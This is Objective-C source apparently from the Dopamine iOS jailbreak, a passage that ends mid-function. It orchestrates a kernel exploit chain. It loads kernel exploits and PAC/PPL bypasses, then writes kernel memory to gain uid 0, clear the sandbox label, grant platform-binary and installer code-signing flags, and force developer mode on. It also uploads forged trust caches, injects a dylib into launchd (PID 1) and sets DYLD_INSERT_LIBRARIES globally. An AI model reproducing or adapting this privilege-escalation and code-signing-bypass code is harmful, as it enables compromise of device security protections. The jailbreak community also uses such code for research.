//
//  Jailbreaker.m
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import "DOJailbreaker.h"
#import "DOEnvironmentManager.h"
#import "DOExploitManager.h"
#import "DOUIManager.h"
#import "DOPreferenceManager.h"
#import <errno.h>
#import <sys/stat.h>
#import <compression.h>
#import <xpf/xpf.h>
#import <dlfcn.h>
#import <libjailbreak/codesign.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/primitives_IOSurface.h>
#import <libjailbreak/physrw_pte.h>
#import <libjailbreak/physrw.h>
#import <libjailbreak/translation.h>
#import <libjailbreak/kernel.h>
#import <libjailbreak/info.h>
#import <libjailbreak/util.h>
#import <libjailbreak/trustcache.h>
#import <libjailbreak/trustcache_fs.h>
#import <libjailbreak/jbserver_boomerang.h>
#import <libjailbreak/signatures.h>
#import <libjailbreak/jbclient_xpc.h>
#import <libjailbreak/jbclient_mach.h>
#import <libjailbreak/kcall_arm64.h>
#import <libjailbreak/basebin_gen.h>
#import <libjailbreak/libjailbreak.h>
#import <libjailbreak/roothider.h>
#import <CoreServices/LSApplicationProxy.h>
#import <sys/utsname.h>
#import "spawn.h"
#import "clock_alarm.h"
#import <IOSurface/IOSurfaceRef.h>
int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);

#define kCFPreferencesNoContainer CFSTR("kCFPreferencesNoContainer")
void _CFPreferencesSetValueWithContainer(CFStringRef key, CFPropertyListRef value, CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
Boolean _CFPreferencesSynchronizeWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
CFArrayRef _CFPreferencesCopyKeyListWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
CFDictionaryRef _CFPreferencesCopyMultipleWithContainer(CFArrayRef keysToFetch, CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);

//char *_dirhelper(int a, char *dst, size_t size);

NSString *const JBErrorDomain = @"JBErrorDomain";
typedef NS_ENUM(NSInteger, JBErrorCode) {
    JBErrorCodeFailedToFindKernel            = -1,
    JBErrorCodeFailedKernelPatchfinding      = -2,
    JBErrorCodeFailedLoadingExploit          = -3,
    JBErrorCodeFailedExploitation            = -4,
    JBErrorCodeFailedBuildingPhysRW          = -5,
    JBErrorCodeFailedCleanup                 = -6,
    JBErrorCodeFailedGetRoot                 = -7,
    JBErrorCodeFailedUnsandbox               = -8,
    JBErrorCodeFailedPlatformize             = -9,
    JBErrorCodeFailedBasebinTrustcache       = -10,
    JBErrorCodeFailedLaunchdInjection        = -11,
    JBErrorCodeFailedInitProtection          = -12,
    JBErrorCodeFailedInitFakeLib             = -13,
    JBErrorCodeFailedDuplicateApps           = -14,
};

static NSString *RootHideLaunchdTracePath(void)
{
    // The jailbreak switches the process to root and changes HOME during
    // elevatePrivileges.  Resolve this once while the app is still in its
    // container so every later phase keeps appending to the same file that
    // the UI can read after a reboot.
    static NSString *tracePath = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        tracePath = [[NSHomeDirectory() stringByAppendingPathComponent:@"Library/Caches/RootHideLaunchdTrace.log"] copy];
    });
    return tracePath;
}

static void RootHideAppendTrace(NSString *message)
{
    NSString *tracePath = RootHideLaunchdTracePath();
    NSDictionary *attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:tracePath error:nil];
    if ([attributes[NSFileSize] unsignedLongLongValue] >= 256 * 1024) return;
    NSFileHandle *traceFile = [NSFileHandle fileHandleForWritingAtPath:tracePath];
    if (!traceFile) return;

    NSString *line = [NSString stringWithFormat:@"[app] %@\n", message];
    [traceFile seekToEndOfFile];
    [traceFile writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
    [traceFile synchronizeFile];
    [traceFile closeFile];
}

static BOOL RootHideWaitForDeferredJailbreakd(void)
{
    // The first lookup is handled by launchd after the injected constructor
    // has returned, which is the safe point where it can spawn jailbreakd.
    // Keep polling until jailbreakd has checked in and launchd returns a
    // usable client port.  This avoids sending a synchronous patch request to
    // a port whose server is not ready yet.
    for (int attempt = 1; attempt <= 200; attempt++) {
        mach_port_t port = jbclient_jailbreakd_lookup();
        if (MACH_PORT_VALID(port)) {
            mach_port_deallocate(mach_task_self(), port);
            RootHideAppendTrace([NSString stringWithFormat:@"deferred jailbreakd ready after %d attempt(s)", attempt]);
            return YES;
        }
        usleep(50000);
    }
    return NO;
}

@implementation DOJailbreaker

- (NSError *)beginRootHideLaunchdTrace
{
    NSString *tracePath = RootHideLaunchdTracePath();
    NSString *header = [NSString stringWithFormat:@"RootHide jailbreak diagnostic trace\n"
                                              @"The final completed phase identifies where the jailbreak startup stopped.\n"
                                              @"This file is replaced at the start of every RootHide jailbreak attempt.\n"
                                              @"Attempt ID: %@\n\n", NSUUID.UUID.UUIDString];

    NSError *writeError = nil;
    if (![header writeToFile:tracePath atomically:YES encoding:NSUTF8StringEncoding error:&writeError]) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Could not create RootHide diagnostic trace: %@", writeError.localizedDescription]}];
    }

    RootHideAppendTrace(@"diagnostic trace started; the next lines come from the app and launchd");
    return nil;
}

- (NSError *)configureRootHideLaunchdTrace
{
    NSString *tracePath = RootHideLaunchdTracePath();
    NSString *configPath = JBROOT_PATH(@"/basebin/.roothide_trace_path");
    NSError *writeError = nil;
    if (![tracePath writeToFile:configPath atomically:YES encoding:NSUTF8StringEncoding error:&writeError]) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Could not configure RootHide diagnostic trace: %@", writeError.localizedDescription]}];
    }

    RootHideAppendTrace(@"diagnostic trace connected to launchd");
    return nil;
}

- (NSError *)gatherSystemInformation
{
    NSString *kernelPath = [[DOEnvironmentManager sharedManager] accessibleKernelPath];
    if (!kernelPath) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedToFindKernel userInfo:@{NSLocalizedDescriptionKey:@"Failed to find kernelcache. Ensure your device is properly connected to the internet. If it still does not work, try installing Dopamine via TrollStore instead."}];
    NSLog(@"Kernel at %@", kernelPath);

    NSString *sptmPath = [[DOEnvironmentManager sharedManager] accessibleSPTMPath];
    if (sptmPath) {
        NSLog(@"SPTM at %@", sptmPath);
    }
    NSString *txmPath = [[DOEnvironmentManager sharedManager] accessibleTXMPath];
    if (txmPath) {
        NSLog(@"TXM at %@", txmPath);
    }
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Patchfinding") debug:NO];
    
    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation, sptmPath ? sptmPath.fileSystemRepresentation : NULL, txmPath ? txmPath.fileSystemRepresentation : NULL);
    if (r == 0) {
        char *sets[] = {
            "translation",
            "trustcache",
            "sandbox",
            "physmap",
            "struct",
            "physrw",
            "IOSurface",
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
        };

        uint32_t idx = 0;
        while(sets[++idx]);

        if (xpf_set_is_supported("devmode")) {
            sets[idx++] = "devmode"; 
        }
        if (xpf_set_is_supported("badRecovery")) {
            sets[idx++] = "badRecovery"; 
        }
        if (xpf_set_is_supported("arm64kcall")) {
            sets[idx++] = "arm64kcall"; 
        }
        if (xpf_set_is_supported("perfkrw")) {
            sets[idx++] = "perfkrw";
        }

        // RootHide needs the namecache and AMFI OID symbols to remove the
        // sandbox's jbroot restrictions and to hide Developer Mode.  Keep
        // these optional so the modern iOS 18 offset sets remain usable on
        // kernels that do not expose one of them.
        if (xpf_set_is_supported("namecache")) {
            sets[idx++] = "namecache";
        }
        if (xpf_set_is_supported("amfi_oids")) {
            sets[idx++] = "amfi_oids";
        }
        sets[idx] = NULL;

        _systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
        if (_systemInfoXdict) {
            xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
            if (gXPF.sptm) {
                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
            }
            if (gXPF.txm) {
                xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticTxmBase", gXPF.txmBase);
            }
            printf("System Info:\n");
            xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
                if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
                return true;
            });
        }
        if (!_systemInfoXdict) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF failed with error: (%s)", xpf_get_error()]}];
        }
        xpf_stop();
    }
    else {
        NSError *error = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF start failed with error: (%s)", xpf_get_error()]}];
        xpf_stop();
        return error;
    }
    
    jbinfo_initialize_dynamic_offsets(_systemInfoXdict);
    jbinfo_initialize_hardcoded_offsets();

    // Stash app identifier into jailbreakInfo
    // This will later allow launchdhook to figure out which process is the dopamine app
    if ([NSBundle mainBundle].bundleIdentifier) {
        gSystemInfo.jailbreakInfo.appIdentifier = strdup([NSBundle mainBundle].bundleIdentifier.UTF8String);
    }

    _systemInfoXdict = jbinfo_get_serialized();
    
    if (_systemInfoXdict) {
        printf("System Info libjailbreak:\n");
        xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
            if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                if (xpc_uint64_get_value(value)) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
            }
            return true;
        });
    }
    
    return nil;
}

- (NSError *)doExploitation
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    DOExploit *pacBypass     = [DOExploitManager sharedManager].selectedPACBypass;
    DOExploit *pplBypass     = [DOExploitManager sharedManager].selectedPPLBypass;

    if (!kernelExploit) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Kernel exploit is required but we did not find any"}];
    }
    if (!pacBypass && [DOEnvironmentManager sharedManager].isPACBypassRequired) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but we did not find any"}];
    }
    if (!pplBypass && [DOEnvironmentManager sharedManager].isPPLBypassRequired) {
        if ([DOEnvironmentManager sharedManager].isSPTM) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"SPTM bypass is required but we did not find any"}];
        }
        else {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PPL bypass is required but we did not find any"}];
        }
    }
    
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Exploiting Kernel (%@)"), kernelExploit.name] debug:NO];
    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load kernel exploit: %s", dlerror()]}];
    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to exploit kernel"}];
    
    jbinfo_initialize_boot_constants();
    libjailbreak_translation_init();
    libjailbreak_IOSurface_primitives_init();
    
    if (pacBypass) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PAC (%@)"), pacBypass.name] debug:NO];
        if ([pacBypass load] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PAC bypass: %s", dlerror()]}];};
        if ([pacBypass run] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PAC"}];}
        // At this point we presume the PAC bypass has given us stable kcall primitives
        gSystemInfo.jailbreakInfo.usesPACBypass = true;
    }

    if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
        if ([DOEnvironmentManager sharedManager].isSPTM) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing SPTM (%@)"), pplBypass.name] debug:NO];
        }
        else {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PPL (%@)"), pplBypass.name] debug:NO];
        }

        if ([pplBypass load] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PPL bypass: %s", dlerror()]}];};
        if ([pplBypass run] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PPL"}];}
        // At this point we presume the PPL bypass gave us unrestricted phys write primitives
    }
    
    if (![DOEnvironmentManager sharedManager].isArm64e) {
        arm64_kcall_init();
    }

    return nil;
}

- (NSError *)buildPhysRWPrimitive
{
    int r = -1;
    if (device_supports_physrw_pte()) {
        r = libjailbreak_physrw_pte_init(false, 0);
    }
    else {
        r = libjailbreak_physrw_init(false);
    }
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBuildingPhysRW userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to build phys r/w primitive: %d", r]}];
    }
    return nil;
}

- (NSError *)cleanUpExploits
{
    int r = [[DOExploitManager sharedManager] cleanUpExploits];
    if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedCleanup userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to cleanup exploits: %d", r]}];
    IOSurface_map_cleanup();
    return nil;
}

- (NSError *)elevatePrivileges
{
    uint64_t proc = proc_self();
    uint64_t ucred = proc_ucred(proc);
    RootHideAppendTrace(@"elevate: resolved current proc and ucred");
    
    // Get uid 0
    kwrite32(proc + koffsetof(proc, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, ruid), 0);
    kwrite32(ucred + koffsetof(ucred, uid), 0);
    RootHideAppendTrace(@"elevate: uid fields written");
    
    // Get gid 0
    kwrite32(proc + koffsetof(proc, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, rgid), 0);
    kwrite32(ucred + koffsetof(ucred, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, groups), 0);
    RootHideAppendTrace(@"elevate: gid fields written");
    
    // Add P_SUGID
    uint32_t flag = kread32(proc + koffsetof(proc, flag));
    if ((flag & P_SUGID) != 0) {
        flag &= P_SUGID;
        kwrite32(proc + koffsetof(proc, flag), flag);
    }
    RootHideAppendTrace(@"elevate: process flags updated");
    
    if (getuid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, uid still %d", getuid()]}];
    if (getgid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, gid still %d", getgid()]}];
    RootHideAppendTrace(@"elevate: uid and gid verified as root");
    
    // Unsandbox
    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
    mac_label_set(label, 1, -1);
    RootHideAppendTrace(@"elevate: sandbox label cleared");
    NSError *error = nil;
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&error];
    if (error) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedUnsandbox userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to unsandbox, /var does not seem accessible (%s)", error.description.UTF8String]}];
    RootHideAppendTrace(@"elevate: /var access verified");
    setenv("HOME", "/var/root", true);
    setenv("CFFIXED_USER_HOME", "/var/root", true);
    setenv("TMPDIR", "/var/tmp", true);
    RootHideAppendTrace(@"elevate: root environment configured");
    
    // FUCKING dirhelper caches the temporary path
    // So we have to do userland patchfinding to find the fucking string and overwrite it
    /*char **pain = NULL;
    uint32_t *dirhelperData = (uint32_t *)_dirhelper;
    for (int i = 0; i < 100; i++) {
        arm64_register destinationReg;
        uint64_t imm = 0;
        if (arm64_dec_ldr_imm(dirhelperData[i], &destinationReg, NULL, &imm, NULL, NULL) == 0) {
            if (ARM64_REG_GET_NUM(destinationReg) == 1) {
                uint32_t *adrpAddr = &dirhelperData[i - 1];
                uint64_t adrpTarget = 0;
                uint32_t adrpInst = *adrpAddr;
                if (arm64_dec_adr_p(adrpInst, (uint64_t)adrpAddr, &adrpTarget, NULL, NULL) == 0) {
                    pain = (char **)(uint64_t)(adrpTarget + imm);
                    break;
                }
            }
        }
    }
    *pain = strdup("/var/tmp");*/
    
    // Get CS_PLATFORM_BINARY
    proc_csflags_set(proc, CS_PLATFORM_BINARY);
    RootHideAppendTrace(@"elevate: requested CS_PLATFORM_BINARY");
    uint32_t csflags;
    csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
    if (!(csflags & CS_PLATFORM_BINARY)) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedPlatformize userInfo:@{NSLocalizedDescriptionKey:@"Failed to get CS_PLATFORM_BINARY"}];
    RootHideAppendTrace(@"elevate: CS_PLATFORM_BINARY verified");

    // RootHide's launchd/jailbreakd path requires the installer bit while
    // it is preparing the randomized jbroot.
    proc_csflags_set(proc, CS_INSTALLER);
    RootHideAppendTrace(@"elevate: requested CS_INSTALLER");
    if (otherJailbreakActived(true)) {
        return [NSError errorWithDomain:@"RootHide" code:1 userInfo:@{NSLocalizedDescriptionKey:@"Another jailbreak is active; reboot the device before continuing."}];
    }
    RootHideAppendTrace(@"elevate: no other jailbreak is active");
    
    return nil;
}

- (NSError *)showNonDefaultSystemApps
{
    _CFPreferencesSetValueWithContainer(CFSTR("SBShowNonDefaultSystemApps"), kCFBooleanTrue, CFSTR("com.apple.springboard"), CFSTR("mobile"), kCFPreferencesAnyHost, kCFPreferencesNoContainer);
    _CFPreferencesSynchronizeWithContainer(CFSTR("com.apple.springboard"), CFSTR("mobile"), kCFPreferencesAnyHost, kCFPreferencesNoContainer);
    return nil;
}

- (NSError *)ensureDevModeEnabled
{
    if (@available(iOS 16.0, *)) {
        uint64_t developer_mode_storage = 0;
        if (ksymbol(developer_mode_enabled)) {
            developer_mode_storage = kread64(ksymbol(developer_mode_enabled));
        }
        else if (ksymbol_txm(txm_developer_mode_storage)) {
            developer_mode_storage = ksymbol_txm(txm_developer_mode_storage);
        }

        if (developer_mode_storage) {
            kwrite8(developer_mode_storage, 1);
        }
    }
    return nil;
}

- (NSError *)loadBasebinTrustcache
{
    RootHideAppendTrace(@"phase: loading BaseBin trust cache");
    int r = randomizeAndLoadBasebinTrustcache(JBROOT_PATH("/basebin/"));
    if (r != 0) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: BaseBin trust cache returned %d", r]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to load randomized BaseBin trustcache: %d", r]}];
    }
    RootHideAppendTrace(@"phase complete: BaseBin trust cache");
    return nil;
}

- (NSError *)injectLaunchdHook
{
    // Host a boomerang server that will be used by launchdhook to get the jailbreak primitives from this app
    mach_port_t serverPort = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
    if (kr != KERN_SUCCESS) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: allocating primitive-handoff port returned %x", kr]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Allocating the primitive-handoff port failed: %x", kr]}];
    }
    kr = mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), serverPort);
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: inserting primitive-handoff send right returned %x", kr]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Inserting the primitive-handoff send right failed: %x", kr]}];
    }

    // Stash port to server in launchd's initPorts[2]
    // Since we don't have the neccessary entitlements, we need to do it over jbctl
    posix_spawnattr_t attr;
    int attrResult = posix_spawnattr_init(&attr);
    if (attrResult != 0) {
        mach_port_destroy(mach_task_self(), serverPort);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Initializing launchd port attributes failed: %d", attrResult]}];
    }
    attrResult = posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){MACH_PORT_NULL, MACH_PORT_NULL, serverPort}, 3);
    if (attrResult != 0) {
        posix_spawnattr_destroy(&attr);
        mach_port_destroy(mach_task_self(), serverPort);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Registering the launchd handoff port failed: %d", attrResult]}];
    }
    pid_t spawnedPid = 0;
    const char *jbctlPath = JBROOT_PATH("/basebin/jbctl");
    int spawnError = posix_spawn(&spawnedPid, jbctlPath, NULL, &attr, (char *const *)(const char *[]){ jbctlPath, "internal", "launchd_stash_port", NULL }, NULL);
    posix_spawnattr_destroy(&attr);
    if (spawnError != 0) {
        mach_port_destroy(mach_task_self(), serverPort);
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: spawning launchd port-stash helper returned %d", spawnError]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Spawning jbctl failed with error code %d", spawnError]}];
    }

    int status = 0;
    pid_t waitResult;
    do {
        waitResult = waitpid(spawnedPid, &status, 0);
    } while (waitResult < 0 && errno == EINTR);
    if (waitResult != spawnedPid) {
        mach_port_destroy(mach_task_self(), serverPort);
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: waiting for launchd port-stash helper returned errno=%d", errno]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"Waiting for jbctl failed"}];
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        mach_port_destroy(mach_task_self(), serverPort);
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: launchd port-stash helper ended with raw status %d", status]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Stashing the launchd handoff port failed with status %d", status]}];
    }
    RootHideAppendTrace(@"phase complete: launchd primitive port stashed");

    dispatch_semaphore_t boomerangDone = dispatch_semaphore_create(0);
    __block int boomerangReceiveError = 0;
    dispatch_source_t boomerangSource = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, (uintptr_t)serverPort, 0, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0));
    if (!boomerangSource) {
        mach_port_destroy(mach_task_self(), serverPort);
        RootHideAppendTrace(@"FAILURE: creating primitive-handoff dispatch source");
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"Creating the primitive-handoff server failed"}];
    }
    dispatch_source_set_event_handler(boomerangSource, ^{
        xpc_object_t xdict = nil;
        int receiveError = xpc_pipe_receive(serverPort, &xdict);
        if (receiveError != 0) {
            boomerangReceiveError = receiveError;
            dispatch_semaphore_signal(boomerangDone);
            return;
        }
        int messageResult = jbserver_received_boomerang_xpc_message(&gBoomerangServer, xdict);
        if (messageResult == JBS_BOOMERANG_DONE) {
            dispatch_semaphore_signal(boomerangDone);
        }
    });
    dispatch_source_set_cancel_handler(boomerangSource, ^{
        mach_port_destroy(mach_task_self(), serverPort);
    });
    dispatch_resume(boomerangSource);

    // Inject launchdhook.dylib into launchd via opainject
    RootHideAppendTrace(@"phase: invoking opainject for launchd (PID 1)");
    int r = exec_cmd(JBROOT_PATH("/basebin/opainject"), "1", JBROOT_PATH("/basebin/launchdhook.dylib"), NULL);
    if (r != 0) {
        dispatch_source_cancel(boomerangSource);
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: opainject returned %d", r]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"opainject failed with error code %d", r]}];
    }
    RootHideAppendTrace(@"phase complete: opainject returned; waiting for primitive-handoff acknowledgement");

    // opainject only returns after launchdhook's constructor has finished, so
    // the acknowledgement should already be queued.  Keep a bounded wait to
    // turn a broken handoff into a useful error instead of freezing the app.
    long handoffWait = dispatch_semaphore_wait(boomerangDone, dispatch_time(DISPATCH_TIME_NOW, 10ull * NSEC_PER_SEC));
    dispatch_source_cancel(boomerangSource);
    if (handoffWait != 0) {
        RootHideAppendTrace(@"FAILURE: primitive-handoff acknowledgement timed out after 10 seconds");
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"Timed out waiting for launchd to acknowledge the primitive handoff"}];
    }
    if (boomerangReceiveError != 0) {
        RootHideAppendTrace([NSString stringWithFormat:@"FAILURE: primitive-handoff server receive returned %d", boomerangReceiveError]);
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"The primitive-handoff server failed: %d", boomerangReceiveError]}];
    }
    RootHideAppendTrace(@"phase complete: launchd primitive-handoff acknowledgement received");

    return nil;
}

- (NSError *)applyProtection
{
    int r = [[DOEnvironmentManager sharedManager] setPrivatePrebootProtected:YES];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitProtection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed initializing protection with error: %d", r]}];
    }
    return nil;
}

- (NSError *)createFakeLib
{
    int r = basebin_generate(false);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Creating fakelib failed with error: %d", r]}];
    }

    cdhash_t *cdhashes = NULL;
    uint32_t cdhashesCount = 0;
    file_collect_untrusted_cdhashes_by_path(JBROOT_PATH("/basebin/.fakelib/dyld"), &cdhashes, &cdhashesCount);
    if (cdhashesCount != 1) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Got unexpected number of cdhashes for dyld???: %d", cdhashesCount]}];
    
    trustcache_file_v1 *dyldTCFile = NULL;
    r = trustcache_file_build_from_cdhashes(cdhashes, cdhashesCount, &dyldTCFile);
    free(cdhashes);
    if (r == 0) {
        int r = trustcache_file_upload_with_uuid(dyldTCFile, DYLD_TRUSTCACHE_UUID);
        if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to upload dyld trustcache: %d", r]}];
        free(dyldTCFile);
    }
    else {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : @"Failed to build dyld trustcache"}];
    }
    
    r = [[DOEnvironmentManager sharedManager] setFakelibMounted:YES];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Mounting fakelib failed with error: %d", r]}];
    }
    
    // Now that fakelib is up, we want to make systemhook inject into any binary we spawn
    setenv("DYLD_INSERT_LIBRARIES", "/usr/lib/systemhook.dylib", 1);
    return nil;
}

- (NSError *)ensureNoDuplicateApps
{
    NSMutableSet *dopamineInstalledAppIds = [NSMutableSet new];
    NSMutableSet *userInstalledAppIds = [NSMutableSet new];
    
    NSString *dopamineAppsPath = JBROOT_PATH(@"/Applications");
    NSString *userAppsPath = @"/var/containers/Bundle/Application";
    
    for (NSString *dopamineAppName in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dopamineAppsPath error:nil]) {
        NSString *infoPlistPath = [[dopamineAppsPath stringByAppendingPathComponent:dopamineAppName] stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *infoDictionary = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
        NSString *appId = infoDictionary[@"CFBundleIdentifier"];
